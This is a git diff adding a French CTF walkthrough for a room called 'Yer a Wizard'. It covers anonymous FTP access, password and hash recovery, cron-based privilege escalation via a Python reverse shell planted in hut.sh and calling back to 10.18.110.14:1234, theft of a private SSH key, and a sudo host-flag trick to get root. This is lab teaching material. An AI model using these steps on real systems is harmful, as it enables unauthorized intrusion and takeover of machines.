@@ -177,6 +177,164 @@ Reverse Engineering, cryptographie, encodage, gestion des erreurs, protocoles, s
 # Room 2 - Yer a Wizard
 
 
+## user.txt ?
+
+# FTP
+
+- On se connecte sur le serveur FTP. Comme beaucoup d'entre eux, nous avons un accès via les credentials login : anonymous - password : anonymous.
+
+  ![alt-text](ressources/connectftp.png)
+- Une fois connecté au serveur nous pouvons voir tous les fichiers du dossier actuel avec la commande :
+
+    ```bash
+    ls -lha
+    ```
+
+- Le fichier '.hidden' est un leurre.
+- On se rend dans le dossier '...'
+    ```bash
+    cd ...
+    ```
+- Avec la commande ls -lha, on remarque le fichier .reallyHidden
+
+  ![alt-text](ressources/reallyHidden.png)
+
+- On peut le récuperre via la commande :
+
+    ```bash
+    mget .reallyHidden
+    ```
+
+- Sur la machine hote nous pouvons lire son contenu.
+
+    ```bash
+    cat .reallyHidden
+    ```
+
+- Nous obtenons le password de Hagrid. Nous pouvons donc nous connecter en ssh.
+
+    ```bash
+    ssh hagrid@10.10.201.107
+    ```
+- Une fois sur hagrid nous pouvons voir le contenu du fichier user.txt.
+
+    ```bash
+    cat user.txt
+    ```
+- Celui-ci est un hash. Afin de récupérer le password, nous devons le déchiffrer sur le site [cyberchef](https://cyberchef.org/)
+
+- Cyberchef est un site qui propose une très longue liste de fonctions qui vous permettront de faire en vrac du codage, décodage (XOR, Base64…etc.), du chiffrement, déchiffrement (AES, DES, Blowfish), de la conversion de fichiers ou de formats, du dump en hexadécimal, de la création de binaires, de la compression, décompression de fichiers, du calcul de hash, du parsing de date ou d’IP…etc., etc
+- Nous allons donc utiliser la fonction "magic" pour decoder ce hash et obtenir notre flag
+
+  ![alt-text](ressources/cyberchef.png)
+
+## root.txt ?
+
+# hagrid
+
+- Une fois connecté en tant que Hagrid en ssh, nous avons un script bash qui affiche seulement un message. Nous allons utliser les cron jobs pour privesc.
+- Cron est un planificateur de tâches dans les systèmes d'exploitation basés sur Unix. Il nous permet de programmer des tâches à exécuter périodiquement.
+- Par défaut, les cron jobs s'exécute en tant que root lors de l'exécution de /etc/crontab, de sorte que toutes les commandes ou tous les scripts appelés par le crontab s'exécuteront également en tant que root.
+- En consultant le fichier /etc/crontabs nous pouvons voir que ron va exécuter hut.sh lorsqu'on reboot.
+
+  ![alt-text](ressources/etc_crontabs.png)
+
+- On va donc modifier le script hut.sh pour qu'il nous donne le shell de ron. Mais comme ce cron jobs se lance à chaque nous allons avoir besoin d'un reverse shell.
+
+- Pour cela on peut utiliser un [générateur de reverse shell](https://www.revshells.com/) et copier la commande dans le script hut.sh.
+
+    ```bash
+    nano hut.sh
+    ```
+
+    ```bash
+    #!/bin/bash
+    export RHOST="10.18.110.14";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+    ``` 
+
+- Sur notre machine hote nous allons "écouter" pour récupérer le shell. L'étape suivante consiste à configurer un écouteur Netcat, qui interceptera le shell inverse lorsqu'il sera exécuté par l'hôte victime, en utilisant les flags suivants :
+
+  -l pour écouter les connexions entrantes
+
+  -v pour une sortie détaillée
+
+  -n pour ignorer la recherche DNS
+
+  -p pour spécifier le port sur lequel écouter
+
+  ```bash
+  nc -lvnp 1234
+  ```
+- Nous allons ensuite reboot sur la machine attaquée. Lors de l'exécution de /sbin/reboot pour redémarrer le système, un rappel sur l'écouteur Netcat est reçu, donnat un shell en tant qu'utilisateur ron
+  ```bash
+  reboot
+  ```
+
+  ![alt-text](ressources/ron.png)
+
+### Ron
+
+- Une fois connécte au shell de ron nous avons accès au fichiers dumbledore.txt
+- Celui ci est composé de plusiseurs hash. Nous allons donc utiliser le site cyberchef pour déchiffrer les hash
+  ![alt-text](ressources/dumbledore.png)
+- Nous allons encore utiliser la fonction "magic" pour decoder le bon hash.
+- Ainsi nous obtenons le mdp de dumbledore.
+
+
+### dumbledore
+
+- On se connecte en ssh avec hagrid
+- ensuite on change de user avec la commande su
+
+    ```bash
+    su dumbledore
+    ```
+- On peut voir le contenu du fichier note.txt. C'est un indice qui nous indique que nous allons essayer de privesc sur harry
+
+  ![alt-text](ressources/dumbledore2.png)
+
+- Si on lance la commande ls -lha, on remarque que le dossier harry à seulement des droits d'exécution.
+
+  ![alt-text](ressources/harry.png)
+
+- Bien que le dossier de l'utilisateur harry ne permette pas de lister les fichiers, le dossier .ssh est toujours accessible et il contient une clé SSH privée :
+
+  ![alt-text](ressources/ssh2.png)
+
+- On copie le hash de la clef ssh sur notre machine hote. On lui assigne les autorisations appropriées et on l'utilise pour s'authentifier en tant qu'utilisateur harry
+
+     ```bash
+      nano key
+      # copier manuellement la clé ssh
+      chmod 600 key
+      ssh -i key harry@10.10.148.205
+    ```
+
+- Nous sommes maintenant connecté en tant que harry
+
+  ![alt-text](ressources/harry2.png)
+
+### harry
+
+- En exécutant le script d'énumeration linpeas, ll semble qu'il existe une règle Sudo pour l'utilisateur harry dans le fichier /etc/sudoers.d/harry
+
+  ![alt-text](ressources/sudoers.png)
+
+- On remarque qu'harry peut exécuter /bin/bash en tant que root, mais uniquement sur l'hôte "strawgoh"
+
+- Le flag -h peut être utilisé pour spécifier l'hôte lors de l'exécution de commandes avec Sudo
+
+- Même si l'hôte ne peut pas être défini, les commandes sont toujours exécutées en tant que root, accordant ainsi un shell de niveau root
+
+  ```bash
+    sudo -h strawgoh /bin/bash
+    ```
+
+  ![alt-text](ressources/toor.png)
+
+
+
+
 # Room 3 - Muso Troglodytarum
 ![alt-text](ressources/Bananier/muso_troglodytarum.png)
 ## user.txt ?
